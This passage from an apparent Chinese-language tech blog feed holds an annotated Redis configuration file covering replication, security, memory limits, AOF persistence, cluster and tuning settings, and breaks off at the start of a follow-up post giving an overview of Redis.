&#x5B9A;&#x4E49;RDB&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x7684;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;# dir /var/lib/redis################################# REPLICATION ################################## &#x914D;&#x7F6E;&#x4E3B;&#x4ECE;&#x76F8;&#x5173;## &#x6B64;&#x9879;&#x4E0D;&#x542F;&#x7528;&#x65F6;&#xFF0C;&#x5219;&#x4E3A;&#x4E3B;&#xFF0C;&#x5982;&#x679C;&#x542F;&#x52A8;&#x5219;&#x4E3A;&#x4ECE;&#xFF0C;&#x4F46;&#x662F;&#x9700;&#x8981;&#x6307;&#x660E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#xFF0C;&#x7AEF;&#x53E3;# slaveof &lt;masterip&gt; &lt;masterport&gt;# &#x5982;&#x679C;&#x4E3B;&#x670D;&#x52A1;&#x8BBE;&#x7F6E;&#x4E86;&#x5BC6;&#x7801;&#x8BA4;&#x8BC1;&#xFF0C;&#x90A3;&#x4E48;&#x4ECE;&#x7684;&#x5219;&#x9700;&#x8981;&#x542F;&#x7528;&#x6B64;&#x9879;&#x5E76;&#x6307;&#x660E;&#x4E3B;&#x7684;&#x8BA4;&#x8BC1;&#x5BC6;&#x7801;&#xFF1A;# # masterauth &lt;master-password&gt;# &#x5B9A;&#x4E49;&#x4ECE;&#x670D;&#x52A1;&#x5BF9;&#x4E3B;&#x670D;&#x52A1;&#x662F;&#x5426;&#x4E3A;&#x53EA;&#x8BFB;&#xFF08;&#x4EC5;&#x590D;&#x5236;&#xFF09;slave-serve-stale-data yes# You can configure a slave instance to accept writes or not. Writing against# a slave instance may be useful to store some ephemeral data (because data# written on a slave will be easily deleted after resync with the master) but# may also cause problems if clients are writing to it because of a# misconfiguration.## Since Redis 2.6 by default slaves are read-only.## Note: read only slaves are not designed to be exposed to untrusted clients# on the internet. It&apos;s just a protection layer against misuse of the instance.# Still a read only slave exports by default all the administrative commands# such as CONFIG, DEBUG, and so forth. To a limited extent you can improve# security of read only slaves using &apos;rename-command&apos; to shadow all the# administrative / dangerous commands.slave-read-only yes# Replication SYNC strategy: disk or socket.## -------------------------------------------------------# WARNING: DISKLESS REPLICATION IS EXPERIMENTAL CURRENTLY# -------------------------------------------------------## New slaves and reconnecting slaves that are not able to continue the replication# process just receiving differences, need to do what is called a &quot;full# synchronization&quot;. An RDB file is transmitted from the master to the slaves.# The transmission can happen in two different ways:## 1) Disk-backed: The Redis master creates a new process that writes the RDB#                 file on disk. Later the file is transferred by the parent#                 process to the slaves incrementally.# 2) Diskless: The Redis master creates a new process that directly writes the#              RDB file to slave sockets, without touching the disk at all.## With disk-backed replication, while the RDB file is generated, more slaves# can be queued and served with the RDB file as soon as the current child producing# the RDB file finishes its work. With diskless replication instead once# the transfer starts, new slaves arriving will be queued and a new transfer# will start when the current one terminates.## When diskless replication is used, the master waits a configurable amount of# time (in seconds) before starting the transfer in the hope that multiple slaves# will arrive and the transfer can be parallelized.## With slow disks and fast (large bandwidth) networks, diskless replication# works better.repl-diskless-sync no# When diskless replication is enabled, it is possible to configure the delay# the server waits in order to spawn the child that transfers the RDB via socket# to the slaves.## This is important since once the transfer starts, it is not possible to serve# new slaves arriving, that will be queued for the next RDB transfer, so the server# waits a delay in order to let more slaves arrive.## The delay is specified in seconds, and by default is 5 seconds. To disable# it entirely just set it to 0 seconds and the transfer will start ASAP.repl-diskless-sync-delay 5# Slaves send PINGs to server in a predefined interval. It&apos;s possible to change# this interval with the repl_ping_slave_period option. The default value is 10# seconds.## repl-ping-slave-period 10# The following option sets the replication timeout for:## 1) Bulk transfer I/O during SYNC, from the point of view of slave.# 2) Master timeout from the point of view of slaves (data, pings).# 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).## It is important to make sure that this value is greater than the value# specified for repl-ping-slave-period otherwise a timeout will be detected# every time there is low traffic between the master and the slave.## repl-timeout 60# Disable TCP_NODELAY on the slave socket after SYNC?## If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and# less bandwidth to send data to slaves. But this can add a delay for# the data to appear on the slave side, up to 40 milliseconds with# Linux kernels using a default configuration.## If you select &quot;no&quot; the delay for data to appear on the slave side will# be reduced but more bandwidth will be used for replication.## By default we optimize for low latency, but in very high traffic conditions# or when the master and slaves are many hops away, turning this to &quot;yes&quot; may# be a good idea.repl-disable-tcp-nodelay no# Set the replication backlog size. The backlog is a buffer that accumulates# slave data when slaves are disconnected for some time, so that when a slave# wants to reconnect again, often a full resync is not needed, but a partial# resync is enough, just passing the portion of data the slave missed while# disconnected.## The bigger the replication backlog, the longer the time the slave can be# disconnected and later be able to perform a partial resynchronization.## The backlog is only allocated once there is at least a slave connected.## repl-backlog-size 1mb# After a master has no longer connected slaves for some time, the backlog# will be freed. The following option configures the amount of seconds that# need to elapse, starting from the time the last slave disconnected, for# the backlog buffer to be freed.## A value of 0 means to never release the backlog.## repl-backlog-ttl 3600# The slave priority is an integer number published by Redis in the INFO output.# It is used by Redis Sentinel in order to select a slave to promote into a# master if the master is no longer working correctly.## A slave with a low priority number is considered better for promotion, so# for instance if there are three slaves with priority 10, 100, 25 Sentinel will# pick the one with priority 10, that is the lowest.## However a special priority of 0 marks the slave as not able to perform the# role of master, so a slave with priority of 0 will never be selected by# Redis Sentinel for promotion.## By default the priority is 100.slave-priority 100# It is possible for a master to stop accepting writes if there are less than# N slaves connected, having a lag less or equal than M seconds.## The N slaves need to be in &quot;online&quot; state.## The lag in seconds, that must be &lt;= the specified value, is calculated from# the last ping received from the slave, that is usually sent every second.## This option does not GUARANTEE that N replicas will accept the write, but# will limit the window of exposure for lost writes in case not enough slaves# are available, to the specified number of seconds.## For example to require at least 3 slaves with a lag &lt;= 10 seconds use:## min-slaves-to-write 3# min-slaves-max-lag 10## Setting one or the other to 0 disables the feature.## By default min-slaves-to-write is set to 0 (feature disabled) and# min-slaves-max-lag is set to 10.# A Redis master is able to list the address and port of the attached# slaves in different ways. For example the &quot;INFO replication&quot; section# offers this information, which is used, among other tools, by# Redis Sentinel in order to discover slave instances.# Another place where this info is available is in the output of the# &quot;ROLE&quot; command of a masteer.## The listed IP and address normally reported by a slave is obtained# in the following way:##   IP: The address is auto detected by checking the peer address#   of the socket used by the slave to connect with the master.##   Port: The port is communicated by the slave during the replication#   handshake, and is normally the port that the slave is using to#   list for connections.## However when port forwarding or Network Address Translation (NAT) is# used, the slave may be actually reachable via different IP and port# pairs. The following two options can be used by a slave in order to# report to its master a specific set of IP and port, so that both INFO# and ROLE will report those values.## There is no need to use both the options if you need to override just# the port or the IP address.## slave-announce-ip 5.5.5.5# slave-announce-port 1234################################## SECURITY #################################### Require clients to issue AUTH &lt;PASSWORD&gt; before processing any other# commands.  This might be useful in environments in which you do not trust# others with access to the host running redis-server.## This should stay commented out for backward compatibility and because most# people do not need auth (e.g. they run their own servers).## Warning: since Redis is pretty fast an outside user can try up to# 150k passwords per second against a good box. This means that you should# use a very strong password otherwise it will be very easy to break.## requirepass foobared# Command renaming.## It is possible to change the name of dangerous commands in a shared# environment. For instance the CONFIG command may be renamed into something# hard to guess so that it will still be available for internal-use tools# but not available for general clients.## Example:## rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52## It is also possible to completely kill a command by renaming it into# an empty string:## rename-command CONFIG &quot;&quot;## Please note that changing the name of commands that are logged into the# AOF file or transmitted to slaves may cause problems.################################### LIMITS ##################################### &#x5B9A;&#x4E49;&#x4E0E;&#x8FDE;&#x63A5;&#x548C;&#x8D44;&#x6E90;&#x9650;&#x5236;&#x76F8;&#x5173;&#x7684;&#x914D;&#x7F6E;# Set the max number of connected clients at the same time. By default# this limit is set to 10000 clients, however if the Redis server is not# able to configure the process file limit to allow for the specified limit# the max number of allowed clients is set to the current file limit# minus 32 (as Redis reserves a few file descriptors for internal uses).## &#x5B9A;&#x4E49;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x9650;&#x5236;&#xFF08;&#x5E76;&#x53D1;&#x6570;&#xFF09;## maxclients 10000# &#x5B9A;&#x4E49;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6700;&#x5927;&#x5185;&#x5B58;&#xFF0C;&#x9ED8;&#x8BA4;&#x6B64;&#x9879;&#x5173;&#x95ED;&#xFF0C;&#x8868;&#x793A;&#x6700;&#x5927;&#x5C06;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6700;&#x5927;&#x53EF;&#x7528;&#x5185;&#x5B58;# maxmemory &lt;bytes&gt;# MAXMEMORY POLICY: how Redis will select what to remove when maxmemory# is reached. You can select among five behaviors:## volatile-lru -&gt; remove the key with an expire set using an LRU algorithm# allkeys-lru -&gt; remove any key according to the LRU algorithm# volatile-random -&gt; remove a random key with an expire set# allkeys-random -&gt; remove a random key, any key# volatile-ttl -&gt; remove the key with the nearest expire time (minor TTL)# noeviction -&gt; don&apos;t expire at all, just return an error on write operations## Note: with any of the above policies, Redis will return an error on write#       operations, when there are no suitable keys for eviction.##       At the date of writing these commands are: set setnx setex append#       incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd#       sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby#       zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby#       getset mset msetnx exec sort## The default is:## maxmemory-policy noeviction# LRU and minimal TTL algorithms are not precise algorithms but approximated# algorithms (in order to save memory), so you can tune it for speed or# accuracy. For default Redis will check five keys and pick the one that was# used less recently, you can change the sample size using the following# configuration directive.## The default of 5 produces good enough results. 10 Approximates very closely# true LRU but costs a bit more CPU. 3 is very fast but not very accurate.## maxmemory-samples 5############################## APPEND ONLY MODE ################################ &#x5B9A;&#x4E49;AOF&#x7684;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#xFF0C;&#x4E00;&#x65E6;&#x6709;&#x67D0;&#x4E00;&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x5C06;&#x4FEE;&#x6539;&#x952E;&#x7684;&#x547D;&#x4EE4;&#x9644;&#x52A0;&#x5230;&#x547D;&#x4EE4;&#x5217;&#x8868;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;MySQL&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;## &#x5B9A;&#x4E49;&#x662F;&#x5426;&#x5F00;&#x542F;&#x6B64;&#x529F;&#x80FD;&#xFF0C;no&#x8868;&#x793A;&#x5173;&#x95ED;&#xFF0C;yes&#x8868;&#x793A;&#x5F00;&#x542F;# &#x8BF4;&#x660E;&#xFF1A;RDB&#x548C;AOF&#x4E24;&#x79CD;&#x6301;&#x4E45;&#x529F;&#x80FD;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x542F;&#x7528;&#xFF0C;&#x4E24;&#x8005;&#x4E0D;&#x5F71;&#x54CD;appendonly no# &#x5B9A;&#x4E49;AOF&#x6587;&#x4EF6; (default: &quot;appendonly.aof&quot;)# appendfilename &quot;appendonly.aof&quot;## If unsure, use &quot;everysec&quot;.# &#x8868;&#x793A;&#x6BCF;&#x6B21;&#x6536;&#x5230;&#x5199;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x7ACB;&#x5373;&#x5199;&#x5230;&#x78C1;&#x76D8;&#x4E0A;&#x7684;AOF&#x6587;&#x4EF6;&#xFF0C;# &#x867D;&#x7136;&#x662F;&#x6700;&#x597D;&#x7684;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x662F;&#x6BCF;&#x6B21;&#x6709;&#x5199;&#x547D;&#x4EE4;&#x65F6;&#x90FD;&#x4F1A;&#x6709;&#x78C1;&#x76D8;&#x7684;I/O&#x64CD;&#x4F5C;&#xFF0C;&#x5BB9;&#x6613;&#x5F71;&#x54CD;redis&#x7684;&#x6027;&#x80FD;# appendfsync always# &#x8868;&#x793A;&#x6BCF;&#x79D2;&#x949F;&#x5199;&#x4E00;&#x6B21;&#xFF0C;&#x4E0D;&#x7BA1;&#x6BCF;&#x79D2;&#x949F;&#x6536;&#x5230;&#x591A;&#x5C11;&#x4E2A;&#x5199;&#x8BF7;&#x6C42;&#x90FD;&#x5F80;&#x78C1;&#x76D8;&#x4E2D;&#x7684;AOF&#x6587;&#x4EF6;&#x4E2D;&#x5199;&#x4E00;&#x6B21;# appendfsync everysec# &#x8868;&#x793A;append&#x529F;&#x80FD;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x90FD;&#x662F;&#x63D0;&#x4EA4;&#x7ED9;OS&#xFF0C;&#x7531;OS&#x81EA;&#x884C;&#x51B3;&#x5B9A;&#x662F;&#x5982;&#x4F55;&#x5199;&#x7684;# # appendfsync no### &#x5F53;&#x6B64;&#x9879;&#x4E3A;yes&#x65F6;&#xFF0C;&#x8868;&#x793A;&#x5728;&#x91CD;&#x5199;&#x65F6;&#xFF0C;&#x5BF9;&#x4E8E;&#x65B0;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x4E0D;&#x505A;&#x540C;&#x6B65;&#xFF0C;&#x800C;&#x6682;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;# no-appendfsync-on-rewrite no# &#x8868;&#x793A;&#x5F53;&#x524D;AOF&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#x662F;&#x4E0A;&#x6B21;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x7684;&#x4E8C;&#x500D;&#x65F6;&#xFF0C;&#x5219;&#x81EA;&#x52A8;&#x65E5;&#x5FD7;&#x91CD;&#x5199;&#x8FC7;&#x7A0B;# auto-aof-rewrite-percentage 100# # # &#x5B9A;&#x4E49;AOF&#x6587;&#x4EF6;&#x91CD;&#x5199;&#x8FC7;&#x7A0B;&#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x6700;&#x5C11;&#x4E3A;&#x5B9A;&#x4E49;&#x5927;&#x5C0F;&#x5219;&#x89E6;&#x53D1;&#x91CD;&#x5199;&#x8FC7;&#x7A0B;# auto-aof-rewrite-min-size 64mb# An AOF file may be found to be truncated at the end during the Redis# startup process, when the AOF data gets loaded back into memory.# This may happen when the system where Redis is running# crashes, especially when an ext4 filesystem is mounted without the# data=ordered option (however this can&apos;t happen when Redis itself# crashes or aborts but the operating system still works correctly).## Redis can either exit with an error when this happens, or load as much# data as possible (the default now) and start if the AOF file is found# to be truncated at the end. The following option controls this behavior.## If aof-load-truncated is set to yes, a truncated AOF file is loaded and# the Redis server starts emitting a log to inform the user of the event.# Otherwise if the option is set to no, the server aborts with an error# and refuses to start. When the option is set to no, the user requires# to fix the AOF file using the &quot;redis-check-aof&quot; utility before to restart# the server.## Note that if the AOF file will be found to be corrupted in the middle# the server will still exit with an error. This option only applies when# Redis will try to read more data from the AOF file but not enough bytes# will be found.aof-load-truncated yes################################ LUA SCRIPTING  ################################ Max execution time of a Lua script in milliseconds.## If the maximum execution time is reached Redis will log that a script is# still in execution after the maximum allowed time and will start to# reply to queries with an error.## When a long running script exceeds the maximum execution time only the# SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be# used to stop a script that did not yet called write commands. The second# is the only way to shut down the server in the case a write command was# already issued by the script but the user doesn&apos;t want to wait for the natural# termination of the script.## Set it to 0 or a negative value for unlimited execution without warnings.lua-time-limit 5000################################ REDIS CLUSTER  ################################# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++# WARNING EXPERIMENTAL: Redis Cluster is considered to be stable code, however# in order to mark it as &quot;mature&quot; we need to wait for a non trivial percentage# of users to deploy it in production.# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++## Normal Redis instances can&apos;t be part of a Redis Cluster; only nodes that are# started as cluster nodes can. In order to start a Redis instance as a# cluster node enable the cluster support uncommenting the following:## cluster-enabled yes# Every cluster node has a cluster configuration file. This file is not# intended to be edited by hand. It is created and updated by Redis nodes.# Every Redis Cluster node requires a different cluster configuration file.# Make sure that instances running in the same system do not have# overlapping cluster configuration file names.## cluster-config-file nodes-6379.conf# Cluster node timeout is the amount of milliseconds a node must be unreachable# for it to be considered in failure state.# Most other internal time limits are multiple of the node timeout.## cluster-node-timeout 15000# A slave of a failing master will avoid to start a failover if its data# looks too old.## There is no simple way for a slave to actually have a exact measure of# its &quot;data age&quot;, so the following two checks are performed:## 1) If there are multiple slaves able to failover, they exchange messages#    in order to try to give an advantage to the slave with the best#    replication offset (more data from the master processed).#    Slaves will try to get their rank by offset, and apply to the start#    of the failover a delay proportional to their rank.## 2) Every single slave computes the time of the last interaction with#    its master. This can be the last ping or command received (if the master#    is still in the &quot;connected&quot; state), or the time that elapsed since the#    disconnection with the master (if the replication link is currently down).#    If the last interaction is too old, the slave will not try to failover#    at all.## The point &quot;2&quot; can be tuned by user. Specifically a slave will not perform# the failover if, since the last interaction with the master, the time# elapsed is greater than:##   (node-timeout * slave-validity-factor) + repl-ping-slave-period## So for example if node-timeout is 30 seconds, and the slave-validity-factor# is 10, and assuming a default repl-ping-slave-period of 10 seconds, the# slave will not try to failover if it was not able to talk with the master# for longer than 310 seconds.## A large slave-validity-factor may allow slaves with too old data to failover# a master, while a too small value may prevent the cluster from being able to# elect a slave at all.## For maximum availability, it is possible to set the slave-validity-factor# to a value of 0, which means, that slaves will always try to failover the# master regardless of the last time they interacted with the master.# (However they&apos;ll always try to apply a delay proportional to their# offset rank).## Zero is the only value able to guarantee that when all the partitions heal# the cluster will always be able to continue.## cluster-slave-validity-factor 10# Cluster slaves are able to migrate to orphaned masters, that are masters# that are left without working slaves. This improves the cluster ability# to resist to failures as otherwise an orphaned master can&apos;t be failed over# in case of failure if it has no working slaves.## Slaves migrate to orphaned masters only if there are still at least a# given number of other working slaves for their old master. This number# is the &quot;migration barrier&quot;. A migration barrier of 1 means that a slave# will migrate only if there is at least 1 other working slave for its master# and so forth. It usually reflects the number of slaves you want for every# master in your cluster.## Default is 1 (slaves migrate only if their masters remain with at least# one slave). To disable migration just set it to a very large value.# A value of 0 can be set but is useful only for debugging and dangerous# in production.## cluster-migration-barrier 1# By default Redis Cluster nodes stop accepting queries if they detect there# is at least an hash slot uncovered (no available node is serving it).# This way if the cluster is partially down (for example a range of hash slots# are no longer covered) all the cluster becomes, eventually, unavailable.# It automatically returns available as soon as all the slots are covered again.## However sometimes you want the subset of the cluster which is working,# to continue to accept queries for the part of the key space that is still# covered. In order to do so, just set the cluster-require-full-coverage# option to no.## cluster-require-full-coverage yes# In order to setup your cluster make sure to read the documentation# available at http://redis.io web site.################################## SLOW LOG #################################### The Redis Slow Log is a system to log queries that exceeded a specified# execution time. The execution time does not include the I/O operations# like talking with the client, sending the reply and so forth,# but just the time needed to actually execute the command (this is the only# stage of command execution where the thread is blocked and can not serve# other requests in the meantime).## You can configure the slow log with two parameters: one tells Redis# what is the execution time, in microseconds, to exceed in order for the# command to get logged, and the other parameter is the length of the# slow log. When a new command is logged the oldest one is removed from the# queue of logged commands.# The following time is expressed in microseconds, so 1000000 is equivalent# to one second. Note that a negative number disables the slow log, while# a value of zero forces the logging of every command.slowlog-log-slower-than 10000# There is no limit to this length. Just be aware that it will consume memory.# You can reclaim memory used by the slow log with SLOWLOG RESET.slowlog-max-len 128################################ LATENCY MONITOR ############################### The Redis latency monitoring subsystem samples different operations# at runtime in order to collect data related to possible sources of# latency of a Redis instance.## Via the LATENCY command this information is available to the user that can# print graphs and obtain reports.## The system only logs operations that were performed in a time equal or# greater than the amount of milliseconds specified via the# latency-monitor-threshold configuration directive. When its value is set# to zero, the latency monitor is turned off.## By default latency monitoring is disabled since it is mostly not needed# if you don&apos;t have latency issues, and collecting data has a performance# impact, that while very small, can be measured under big load. Latency# monitoring can easily be enabled at runtime using the command# &quot;CONFIG SET latency-monitor-threshold &lt;milliseconds&gt;&quot; if needed.latency-monitor-threshold 0############################# EVENT NOTIFICATION ############################### Redis can notify Pub/Sub clients about events happening in the key space.# This feature is documented at http://redis.io/topics/notifications## For instance if keyspace events notification is enabled, and a client# performs a DEL operation on key &quot;foo&quot; stored in the Database 0, two# messages will be published via Pub/Sub:## PUBLISH __keyspace@0__:foo del# PUBLISH __keyevent@0__:del foo## It is possible to select the events that Redis will notify among a set# of classes. Every class is identified by a single character:##  K     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.#  E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...#  $     String commands#  l     List commands#  s     Set commands#  h     Hash commands#  z     Sorted set commands#  x     Expired events (events generated every time a key expires)#  e     Evicted events (events generated when a key is evicted for maxmemory)#  A     Alias for g$lshzxe, so that the &quot;AKE&quot; string means all the events.##  The &quot;notify-keyspace-events&quot; takes as argument a string that is composed#  of zero or multiple characters. The empty string means that notifications#  are disabled.##  Example: to enable list and generic events, from the point of view of the#           event name, use:##  notify-keyspace-events Elg##  Example 2: to get the stream of the expired keys subscribing to channel#             name __keyevent@0__:expired use:##  notify-keyspace-events Ex##  By default all notifications are disabled because most users don&apos;t need#  this feature and the feature has some overhead. Note that if you don&apos;t#  specify at least one of K or E, no events will be delivered.notify-keyspace-events &quot;&quot;############################### ADVANCED CONFIG ################################ Hashes are encoded using a memory efficient data structure when they have a# small number of entries, and the biggest entry does not exceed a given# threshold. These thresholds can be configured using the following directives.hash-max-ziplist-entries 512hash-max-ziplist-value 64# Lists are also encoded in a special way to save a lot of space.# The number of entries allowed per internal list node can be specified# as a fixed maximum size or a maximum number of elements.# For a fixed maximum size, use -5 through -1, meaning:# -5: max size: 64 Kb  &lt;-- not recommended for normal workloads# -4: max size: 32 Kb  &lt;-- not recommended# -3: max size: 16 Kb  &lt;-- probably not recommended# -2: max size: 8 Kb   &lt;-- good# -1: max size: 4 Kb   &lt;-- good# Positive numbers mean store up to _exactly_ that number of elements# per list node.# The highest performing option is usually -2 (8 Kb size) or -1 (4 Kb size),# but if your use case is unique, adjust the settings as necessary.list-max-ziplist-size -2# Lists may also be compressed.# Compress depth is the number of quicklist ziplist nodes from *each* side of# the list to *exclude* from compression.  The head and tail of the list# are always uncompressed for fast push/pop operations.  Settings are:# 0: disable all list compression# 1: depth 1 means &quot;don&apos;t start compressing until after 1 node into the list,#    going from either the head or tail&quot;#    So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail]#    [head], [tail] will always be uncompressed; inner nodes will compress.# 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail]#    2 here means: don&apos;t compress head or head-&gt;next or tail-&gt;prev or tail,#    but compress all nodes between them.# 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail]# etc.list-compress-depth 0# Sets have a special encoding in just one case: when a set is composed# of just strings that happen to be integers in radix 10 in the range# of 64 bit signed integers.# The following configuration setting sets the limit in the size of the# set in order to use this special memory saving encoding.set-max-intset-entries 512# Similarly to hashes and lists, sorted sets are also specially encoded in# order to save a lot of space. This encoding is only used when the length and# elements of a sorted set are below the following limits:zset-max-ziplist-entries 128zset-max-ziplist-value 64# HyperLogLog sparse representation bytes limit. The limit includes the# 16 bytes header. When an HyperLogLog using the sparse representation crosses# this limit, it is converted into the dense representation.## A value greater than 16000 is totally useless, since at that point the# dense representation is more memory efficient.## The suggested value is ~ 3000 in order to have the benefits of# the space efficient encoding without slowing down too much PFADD,# which is O(N) with the sparse encoding. The value can be raised to# ~ 10000 when CPU is not a concern, but space is, and the data set is# composed of many HyperLogLogs with cardinality in the 0 - 15000 range.hll-sparse-max-bytes 3000# Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in# order to help rehashing the main Redis hash table (the one mapping top-level# keys to values). The hash table implementation Redis uses (see dict.c)# performs a lazy rehashing: the more operation you run into a hash table# that is rehashing, the more rehashing &quot;steps&quot; are performed, so if the# server is idle the rehashing is never complete and some more memory is used# by the hash table.## The default is to use this millisecond 10 times every second in order to# actively rehash the main dictionaries, freeing memory when possible.## If unsure:# use &quot;activerehashing no&quot; if you have hard latency requirements and it is# not a good thing in your environment that Redis can reply from time to time# to queries with 2 milliseconds delay.## use &quot;activerehashing yes&quot; if you don&apos;t have such hard requirements but# want to free memory asap when possible.activerehashing yes# The client output buffer limits can be used to force disconnection of clients# that are not reading data from the server fast enough for some reason (a# common reason is that a Pub/Sub client can&apos;t consume messages as fast as the# publisher can produce them).## The limit can be set differently for the three different classes of clients:## normal -&gt; normal clients including MONITOR clients# slave  -&gt; slave clients# pubsub -&gt; clients subscribed to at least one pubsub channel or pattern## The syntax of every client-output-buffer-limit directive is the following:## client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;## A client is immediately disconnected once the hard limit is reached, or if# the soft limit is reached and remains reached for the specified number of# seconds (continuously).# So for instance if the hard limit is 32 megabytes and the soft limit is# 16 megabytes / 10 seconds, the client will get disconnected immediately# if the size of the output buffers reach 32 megabytes, but will also get# disconnected if the client reaches 16 megabytes and continuously overcomes# the limit for 10 seconds.## By default normal clients are not limited because they don&apos;t receive data# without asking (in a push way), but just after a request, so only# asynchronous clients may create a scenario where data is requested faster# than it can read.## Instead there is a default limit for pubsub and slave clients, since# subscribers and slaves receive data in a push fashion.## Both the hard or the soft limit can be disabled by setting them to zero.client-output-buffer-limit normal 0 0 0client-output-buffer-limit slave 256mb 64mb 60client-output-buffer-limit pubsub 32mb 8mb 60# Redis calls an internal function to perform many background tasks, like# closing connections of clients in timeout, purging expired keys that are# never requested, and so forth.## Not all tasks are performed with the same frequency, but Redis checks for# tasks to perform according to the specified &quot;hz&quot; value.## By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when# Redis is idle, but at the same time will make Redis more responsive when# there are many keys expiring at the same time, and timeouts may be# handled with more precision.## The range is between 1 and 500, however a value over 100 is usually not# a good idea. Most users should use the default of 10 and raise this up to# 100 only in environments where very low latency is required.hz 10# When a child rewrites the AOF file, if the following option is enabled# the file will be fsync-ed every 32 MB of data generated. This is useful# in order to commit the file to the disk more incrementally and avoid# big latency spikes.aof-rewrite-incremental-fsync yes</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x914D;&amp;#x7F6E;&amp;#x6587;&amp;#x4EF6;&amp;#x8BE6;&amp;#x89E3;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x914D;&amp;#x7F6E;&amp;#x6587;&amp;#x4EF6;&amp;#x8BE6;&amp;#x89E3;&quot; class=&quot;heade
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis概述</title>
    <link href="https://marnm.github.io//posts/18d7d749/"/>
    <id>https://marnm.github.io//posts/18d7d749/</id>
    <published>2022-06-07T04:48:52.000Z</published>
    <updated>2022-06-07T05:06:06.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x6982;&#x8FF0;"><a href="#Redis&#x6982;&#x8FF0;" class="headerlink" title="Redis&#x6982;&#x8FF0;"></a>Redis&#x6982;&#x8FF0;</h1><h2 id="&#x4EC0;&#x4E48;&#x662F;Redis"><a href="#&#x4EC0;&#x4E48;&#x662F;Redis" class="headerlink" title="&#x4EC0;&#x4E48;&#x662F;Redis"></a>&#x4EC0;&#x4E48;&#x662F;Redis</h2><p>Redis&#x7684;&#x51FA;&#x73B0;&#x65F6;&#x95F4;&#x5E76;&#x4E0D;&#x957F;&#xFF0C;&#x662F;NoSQL&#x7684;&#x4E00;&#x79CD;&#xFF0C;&#x57FA;&#x4E8E;&#x952E;-&#x503C;&#x578B;&#x7684;&#x5B58;&#x50A8;&#xFF0C;&#x4E0E;memcache&#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x662F;memcache&#x4E2D;&#x53EA;&#x662F;&#x5185;&#x5B58;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x800C;Redis&#x4E0D;&#x4EC5;&#x662F;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x8FD8;&#x63D0;&#x4F9B;&#x6301;&#x4E45;&#x5B58;&#x50A8;&#xFF0C;&#x5728;2009&#x5E74;&#x7B2C;&#x4E00;&#x6B21;&#x53D1;&#x5E03;Redis&#x3002;</p><p>Redis&#x5168;&#x79F0;&#xFF08;Remote Dictionary 